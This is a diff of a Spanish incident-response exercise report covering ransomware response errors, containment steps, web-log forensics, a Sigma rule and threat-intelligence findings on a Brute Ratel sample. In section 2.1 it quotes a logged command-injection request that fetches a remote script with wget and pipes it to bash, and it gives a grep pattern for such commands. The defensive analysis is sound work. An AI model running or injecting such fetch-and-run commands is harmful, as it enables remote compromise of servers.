@@ -4,78 +4,80 @@
 
 ### 1.1 Errores cometidos en las primeras horas
 
-**Falta de procedimientos y desorganización**: El error principal es no tener un plan de respuesta por escrito. Esto generó una respuesta nula o inefectiva, ya que no se definieron roles ni pasos a seguir según el tipo de incidente.
+**Falta de procedimientos y desorganización**: El error principal es no disponer de un plan de respuesta a incidentes por escrito. Eso provoca una actuación descoordinada e inefectiva, porque no se definen roles, prioridades ni pasos a seguir según el tipo de incidente.
 
-**Mala gestión técnica y pérdida de evidencia forense**: Se reiniciaron servidores y se apagaron equipos sin investigar la incidencia real ni extraer logs previamente. Reiniciar no va a descifrar los archivos y solo provoca la pérdida de datos volátiles fundamentales para el análisis forense ; lo ideal habría sido aplicar una cuarentena sin apagar las máquinas.
+**Mala gestión técnica y pérdida de evidencia forense**: Se reiniciaron servidores y se apagaron equipos sin preservar antes la evidencia. Reiniciar no va a descifrar los archivos y, además, puede destruir datos volátiles útiles para el análisis forense. La prioridad inicial debe ser aislar de forma coordinada los sistemas afectados y no apagar equipos.
 
-**Inexistencia de personal especializado**: No contar con personal dedicado en el CERT interno y retrasar el contacto con el proveedor de ciberseguridad fue crítico. Ellos son los que deben encargarse de contener e investigar para mitigar el impacto real.
+**Inexistencia de personal especializado**: No contar con un equipo interno de respuesta o, al menos, activar de inmediato al proveedor especializado de ciberseguridad fue un fallo relevante. La contención, el análisis y la coordinación técnica no deberían recaer en personal improvisado en mitad del incidente.
 
-**Gestión negligente de los backups**: Se intentó restaurar el backup sin revisar su estado, olvidando que las copias son el primer objetivo de los atacantes para evitar que la empresa mitigue el impacto. Además, restaurar directamente sin haber analizado antes los equipos afectados borra pruebas clave.
+**Gestión negligente de los backups**: Se intentó restaurar una copia de seguridad sin validar antes si estaba íntegra o comprometida. En ransomware, los atacantes suelen intentar cifrar o inutilizar las copias accesibles para impedir la recuperación. Restaurar sin haber contenido primero la intrusión puede reintroducir el problema y, además, eliminar trazas útiles para la investigación.
 
-**Contacto directo con los atacantes sin autorización**: Un administrador contactó con el grupo criminal sin planificarlo con la directiva o el equipo legal. Esto no garantiza resolver el incidente ni recuperarse tras pagar, y expone a la empresa innecesariamente.
+**Contacto directo con los atacantes sin autorización**: Un administrador contactó con el grupo criminal sin coordinación con dirección, legal ni el equipo de respuesta. Esa actuación no garantiza la recuperación, puede entorpecer la gestión del incidente y complica cualquier decisión posterior sobre notificación, negociación o denuncia.
 
 ### 1.2. Clasificación del incidente
 
-**Taxonomía**: Código Dañino (Malware) - Ransomware. Se identifica así porque el incidente consiste en el cifrado de archivos de red compartidos por un software malicioso llamado "DarkUCM". Además, existe una extorsión clara al exigir un pago de 2,5 BTC para recuperar el acceso.
+**Taxonomía**: Código Dañino (Malware), concretamente ransomware. La clasificación es coherente con un escenario en el que un software malicioso cifra archivos de recursos compartidos y añade una extorsión económica para recuperar el acceso.
 
-**Peligrosidad**: Alta. Aunque aún no conocemos el alcance total, ya afecta a servicios críticos como los archivos compartidos de la red. El hecho de que el ransomware se haya reactivado y propagado a nuevas unidades tras reiniciar el servidor indica que la amenaza está activa y en expansión.
+**Peligrosidad**: Alta. Aunque al inicio no se conozca todo el alcance, ya hay afectación sobre servicios relevantes y existen indicios de propagación. Si el cifrado se reactiva tras reiniciar sistemas o alcanza nuevas unidades de red, debe asumirse que la amenaza sigue activa y con capacidad de expansión.
 
-**Impacto**: Alto. Al ser una empresa financiera, la indisponibilidad de archivos compartidos bloquea la operativa de los empleados. El impacto es significativo por la naturaleza del sector (financiero) y porque ya se están viendo afectados procesos de negocio el lunes por la mañana, comprometiendo datos que pueden ser críticos.
+**Impacto**: Alto. En una entidad financiera, la indisponibilidad de archivos compartidos afecta de forma directa a la operativa y a la continuidad de negocio. Además del impacto operativo, debe contemplarse el riesgo regulatorio, reputacional y de posible exposición de datos.
 
 ### 1.3. Sesión de evaluación preliminar
 
 Como Incident Handler, realizaría las siguientes 5 preguntas clave para tomar el control de la situación:
 
-_¿Disponéis de un inventario actualizado de activos y cuáles de ellos están identificados como críticos para el negocio?_ Necesito saber qué máquinas son el "corazón" de la empresa (servidores de base de datos, controladores de dominio, etc.) para priorizar su protección y evaluar el alcance real del impacto en la operativa.¿
-_Cuál es el esquema actual de segmentación de la red y qué dispositivos de seguridad (Firewalls, WAF, VPN) están activos?_
-Esto ayuda a entender si existe aislamiento entre departamentos o si la red es plana. Es fundamental para diseñar medidas de contención inmediata y evitar que el ransomware siga saltando de una subred a otra.
-_¿Qué herramientas de monitorización y respuesta tenéis (EDR, SIEM, Antivirus) y dónde se centralizan sus logs?_
-Para el análisis forense y la detección activa, necesito saber si hay trazas de la ejecución del malware o de conexiones sospechosas. Saber dónde están los logs permite asegurar que no se sobrescriban o sean borrados por el atacante.
-_¿Cuál es el estado y la ubicación de las copias de seguridad, y están aisladas de la red principal (offline/inmutables)?_
-Antes de intentar cualquier recuperación, debemos asegurar que el backup no está cifrado ni comprometido. Si las copias están conectadas a la red infectada, podrían ser el próximo objetivo o ya estar inservibles.
-_¿Qué acciones técnicas exactas se han ejecutado desde la detección del primer aviso hasta ahora?_
-Necesito saber si se han reiniciado equipos o restaurado datos para valorar qué evidencia volátil (en RAM o logs) se ha podido perder ya. Esto evita que sigamos cometiendo errores que dificulten el análisis de la causa raíz.
+_¿Disponéis de un inventario actualizado de activos y cuáles de ellos están identificados como críticos para el negocio?_
+Necesito saber qué activos son prioritarios para la continuidad operativa, como controladores de dominio, servidores de ficheros, bases de datos o plataformas de banca interna, para ordenar correctamente la contención y la recuperación.
+
+_¿Cuál es el esquema actual de segmentación de red y qué controles perimetrales o internos (como Firewalls, WAF, VPN) están activos?_
+Esto permite saber si la red está segmentada o si el atacante puede moverse lateralmente con facilidad. También ayuda a decidir qué bloquear primero y dónde aplicar medidas de aislamiento sin detener por completo el negocio y mitigar el impacto del ataque.
+
+_¿Qué herramientas de monitorización y respuesta tenéis (como EDR, SIEM, Antivirus) desplegadas y dónde se centralizan sus logs?_
+Para el análisis forense necesito saber si hay EDR, SIEM, antivirus, firewall, proxy o registros de autenticación disponibles. La ubicación y retención de esos logs es crítica para no perder evidencia y reconstruir la secuencia del ataque. Además ver cual es la configuración y reglas de estos sistemas para mejorarlos en respuesta del incidente.
+
+_¿Cuál es el estado de las copias de seguridad y están aisladas de la red principal?_
+Antes de hablar de restauración hay que validar si las copias están íntegras, si son recientes y si están realmente aisladas, offline o protegidas frente al cifrado malicioso.
+
+_¿Qué acciones técnicas exactas se han ejecutado desde el primer aviso hasta este momento?_
+Necesito saber qué equipos se han reiniciado, qué servicios se han detenido, si se han restaurado sistemas o si se han tocado credenciales. Eso determina qué evidencia se ha podido perder y qué errores hay que dejar de repetir inmediatamente.
 
 ### 1.4. Medidas iniciales de contención
 
-Como no podemos cortar Internet totalmente, mi prioridad sería frenar el movimiento lateral y asegurar la supervivencia de las evidencias. Estas son las 5 medidas:
+Como no podemos cortar Internet por completo, mi prioridad sería frenar el movimiento lateral, contener la propagación y preservar la evidencia. Estas serían las 6 medidas iniciales:
 
-**Segmentación de emergencia y control de tráfico**: Al ser una red plana, el atacante se mueve sin restricciones. Implementaría reglas de firewall para bloquear puertos críticos (RDP, SMB) y crearía zonas de seguridad para aislar los servidores sanos de la red infectada.
+**Segmentación de emergencia y control de tráfico lateral**: Al tratarse de una red plana, el atacante puede desplazarse con facilidad. Aplicaría reglas temporales en firewalls internos y ACL para limitar RDP, SMB, WinRM y otros protocolos de administración remota entre segmentos que no necesiten comunicarse.
 
-**Extracción prioritaria de logs y evidencias volátiles**: Antes de que se sobrescriban o el atacante los borre, realizaría la recolección de logs de los Firewalls, Proxies y de los sistemas afectados. Me centraría especialmente en volcar la información de los equipos que siguen encendidos para no perder conexiones de red activas y procesos en memoria (evidencia volátil).
+**Extracción prioritaria de logs y evidencias volátiles**: Antes de que se sobrescriban o sean borrados, recogería logs de controladores de dominio, firewalls, proxies, EDR y hosts afectados. En los sistemas que sigan encendidos, priorizaría la captura de memoria y de conexiones activas siempre que sea viable.
 
-**Gestión de identidades y reseteo de cuentas**: Con los controladores de dominio comprometidos, es obligatorio resetear las contraseñas de todos los administradores y forzar el cierre de sesiones activas. No sirve de nada contener si el atacante sigue teniendo credenciales válidas.
+**Gestión de identidades y revocación de accesos privilegiados**: Si existen indicios de compromiso en controladores de dominio comprometidos, iniciaría un reseteo escalonado de cuentas privilegiadas, cuentas de servicio y credenciales de alto valor, además de forzar el cierre de sesiones activas y revisar altas recientes de cuentas o privilegios.
 
-**Filtrado estricto de la conexión a Internet**: Configuraría el firewall perimetral para bloquear todo el tráfico de salida hacia IPs desconocidas, permitiendo solo lo esencial para el negocio. Esto dificulta que el ransomware se comunique con su servidor de control (C2) para recibir órdenes o exfiltrar más datos.
+**Restricción estricta del tráfico saliente**: Configuraría el firewall perimetral para permitir únicamente los destinos imprescindibles para la operación. El objetivo no es "bloquear IPs desconocidas" de forma genérica, sino reducir la superficie de salida para dificultar la comunicación con C2, la exfiltración y la descarga de nuevas herramientas.
 
-**Auditoría de Backups y Plan de Comunicación**: Paralizaría cualquier restauración hasta confirmar que las copias son íntegras y no están infectadas. Al mismo tiempo, activaría el protocolo de comunicación con el personal, el equipo legal y las autoridades (INCIBE/AEPD) para cumplir con la normativa y gestionar la crisis.
-
-**Plan de comunicación y notificación legal**: Alertaría a todo el personal con instrucciones claras para evitar que el incidente crezca. Además, coordinaría con el equipo legal y de comunicación la notificación a instituciones gubernamentales (como el INCIBE o la AEPD) para cumplir con la normativa vigente y gestionar la reputación de la empresa.
+**Validación de backups y activación del plan de comunicación**: Detendría cualquier restauración hasta confirmar que las copias son limpias y utilizables. En paralelo, activaría el plan de comunicación con dirección, personal técnico, equipo legal y autoridades competentes para que la crisis se gestione con criterios técnicos, regulatorios y reputacionales coherentes.
 
 ## 2. Tarea 2
 
 ### 2.1 Identificación de la actividad maliciosa
 
-Para localizar el vector de ataque en el servidor web, se ha procedido a filtrar el archivo access.log buscando patrones de ejecución de comandos, descarga de artefactos externos y caracteres de encadenamiento (|, ;, &). Se ha empleado el siguiente comando: `grep -E "wget|curl|chmod|bash|sh|;|%20" access.log`
+Para localizar el posible vector de ataque en el servidor web, se ha filtrado el archivo access.log buscando patrones típicos de inyección de comandos, descarga de artefactos y encadenamiento de órdenes (`|`, `;`, `&`). Se ha empleado el siguiente comando: `grep -E "wget|curl|chmod|bash|sh|;|%20" access.log`
 
 ![Ruta maliciosa](<2.1-ruta maliciosa.png>)
 
-De esta forma se ha identificado la línea de log:
+De esta forma se ha identificado la siguiente línea de log:
 
 ```bash
-192.168.5.23 - - [12/Jun/2025:03:41:17 +0200] "GET /cgi-bin/status.sh?user=;wget http://malicious
-domain.com/payload.sh -O- | bash HTTP/1.1" 200 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+192.168.5.23 - - [12/Jun/2025:03:41:17 +0200] "GET /cgi-bin/status.sh?user=;wget http://maliciousdomain.com/payload.sh -O- | bash HTTP/1.1" 200 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 ```
 
-El log revela una explotación exitosa de una vulnerabilidad de Inyección de Comandos a través del parámetro user en el script status.sh. El atacante utiliza el punto y coma (;) para finalizar la instrucción legítima e inyectar un nuevo comando que descarga un script malicioso (payload.sh) mediante wget. Posteriormente, utiliza un "pipe" (|) para redirigir el contenido directamente a bash, logrando la ejecución del código en memoria sin necesidad de guardar el archivo en disco (evadiendo así análisis de archivos estáticos). El código de respuesta 200 OK confirma que la petición fue procesada por el servidor, estableciendo este evento como el vector de entrada inicial.
+La entrada es compatible con la explotación de una vulnerabilidad de inyección de comandos a través del parámetro `user` del script `status.sh`. El atacante usa `;` para cerrar la instrucción esperada e insertar un `wget` que descarga un script y lo redirige directamente a `bash` mediante una tubería. Ese patrón es característico de ejecución remota de comandos sin necesidad de guardar previamente el payload en disco. El código `200 OK` indica que el CGI procesó la petición; por sí solo no demuestra toda la intrusión, pero sí refuerza que el intento de explotación llegó a ejecutarse en el servidor web.
 
 ## 2.2 Regla Sigma para detección de accesos fuera de horario
 
-Para detectar intentos de acceso lateral o persistencia mediante RDP y conexiones de red en los controladores de dominio, se ha desarrollado la siguiente regla Sigma:
+Para detectar accesos potencialmente sospechosos fuera del horario habitual en controladores de dominio, se propone la siguiente regla Sigma:
 
-```bash
-title: Inicio de sesión de red o RDP fuera de horario de operación
-id: 123
+```yaml
+title: Inicio de sesión de red o RDP fuera de horario en controladores de dominio
+id: 9b1deb4d-5b4a-4c3b-9b1d-123456789abc
 status: experimental
 description: |
     Detecta inicios de sesión de tipo red (3) o RDP (10) en controladores de dominio
@@ -91,6 +93,9 @@ detection:
         LogonType:
             - 3
             - 10
+    selection_dc:
+        ComputerName|contains:
+            - DC
     business_hours:
         @timestamp|hour:
             - 8
@@ -104,24 +109,25 @@ detection:
             - 16
             - 17
             - 18
-    condition: selection_logon and not business_hours
+    condition: selection_logon and selection_dc and not business_hours
 falsepositives:
-    - Labores de mantenimiento nocturnas autorizadas.
+    - Tareas de administración o mantenimiento fuera de horario previamente autorizadas
+    - Procesos automatizados o herramientas de monitorización
 level: high
 ```
 
-Esta regla monitoriza el evento 4624 (inicio de sesión exitoso) filtrando por los tipos 3 (Red) y 10 (RDP), críticos para detectar movimientos laterales. Se define el horario laboral (08:00 a 19:00) para excluirlo de la alerta mediante la condición not business_hours, centrando la detección en actividad sospechosa fuera de la jornada habitual. El nivel se establece en high debido a la criticidad de los activos (Controladores de Dominio) y la alta probabilidad de compromiso si se accede fuera de horas.
+La detección se basa en el evento 4624 de Windows, que registra inicios de sesión exitosos, y filtra los tipos de logon 3 y 10, correspondientes a accesos de red y RDP. Se centra en los controladores de dominio porque son activos especialmente críticos y cualquier acceso no autorizado a ellos puede comprometer al resto de la infraestructura. Además, se define como horario habitual el intervalo entre las 08:00 y las 19:00 para reducir ruido y destacar accesos fuera de esa franja, que resultan menos comunes y, por tanto, más sospechosos. Aun así, la regla puede generar falsos positivos en casos de mantenimiento o administración autorizada fuera de horario.
 
 ## 2.3 Análisis de la muestra maliciosa
 
-Se ha realizado la búsqueda en VirusTotal
+Se ha realizado la búsqueda en VirusTotal.
 
 ![Búsqueda en VirusTotal](2.3-busqueda-virus-total.png)
 
-**Pregunta 1**: Tras el análisis del hash `617e31e9f71b365fe69719d3fc980d763e827a4f93d0e776d1587d0bfdb47674` en VirusTotal y la consulta de los reportes de sandboxes como Zenbox y Yomi Hunter, se identifican conexiones directas hacia las direcciones IP de Comando y Control (C2) `185.106.92.54` y `82.115.223.40`, ambas operando sobre el puerto 8041. Asimismo, se detecta tráfico hacia la IP `64.233.181.94` (puerto 443) y resoluciones DNS para los dominios maliciosos bazarunet.com, tiguanin.com y greshunka.com.
+**Pregunta 1**: Tras analizar el hash en VirusTotal, se observan comunicaciones con varias IP, entre ellas 185.106.92.54 y 82.115.223.40 por el puerto 8041. También aparece tráfico hacia 64.233.181.94 por el puerto 443 y resoluciones DNS para los dominios bazarunet.com, tiguanin.com y greshunka.com. Los dos primeros indicadores son los que encajan mejor con infraestructura sospechosa vista en la muestra; en cambio, una conexión aislada por 443 a una IP pública no debe etiquetarse automáticamente como C2 sin más contexto.
 
-**Pregunta 2**: Se determina que el archivo analizado forma parte de una campaña que utiliza un agente conocido como "Badger", perteneciente al framework de simulación de adversarios Brute Ratel C4 (BRc4). El artefacto intenta suplantar la identidad de una librería legítima de NVIDIA denominada `PhysXCooking64.dll` para evadir la detección de soluciones de seguridad.
+**Pregunta 2**: Con la información disponible, la muestra puede relacionarse con Badger, el agente asociado a Brute Ratel C4 (BRc4). Brute Ratel es una herramienta comercial de red teaming que, según MITRE ATT&CK, también ha sido utilizada en campañas maliciosas reales. Además, el uso de DLL Side-Loading o de técnicas similares de carga de DLL encaja con comportamientos documentados para este tipo de herramienta, ya que permite ejecutar código malicioso apoyándose en binarios legítimos.
 
-**Pregunta 3**: Consultando fuentes de inteligencia de amenazas, la utilización de este malware (Brute Ratel) se asocia inicialmente a un actor de amenazas de alta sofisticación identificado como APT29 (también conocido como Cozy Bear o Nobelium). Este grupo es reconocido por su vinculación con operaciones de ciberespionaje estatal y el uso de herramientas comerciales para dificultar la atribución.
+**Pregunta 3**: El uso de Brute Ratel se ha visto en campañas de actores avanzados, incluso grupos APT. Sin embargo, no sería correcto atribuir esta muestra a un actor concreto solo por esa coincidencia, porque se trata de una herramienta reutilizable y no exclusiva de un único grupo. Por tanto, con la evidencia disponible, lo correcto es dejar la atribución abierta.
 
-**Pregunta 4**: El vector de entrada más habitual asociado a este malware es el Spear Phishing dirigido. Se basa habitualmente en el envío de archivos adjuntos (ISO, LNK o ZIP) que ejecutan una cadena de infección mediante DLL Side-Loading, utilizando procesos legítimos del sistema como rundll32.exe para cargar la librería maliciosa. Se debe comunicar al equipo forense la necesidad de auditar la ejecución de procesos en directorios temporales (AppData\Local\Temp) y rastrear el origen del compromiso en el buzón de correo del empleado del departamento de compras.
+**Pregunta 4**: Un vector de entrada plausible, y además documentado en campañas que emplean herramientas de este tipo, es el spear phishing mediante correos con adjuntos como ISO, LNK o ZIP. A partir de ahí, la infección puede apoyarse en técnicas de DLL Side-Loading para ejecutar el malware aprovechando binarios legítimos. De cara al análisis forense, revisaría el correo del usuario afectado, las descargas recientes y la ejecución de procesos en rutas temporales para reconstruir el origen del compromiso.
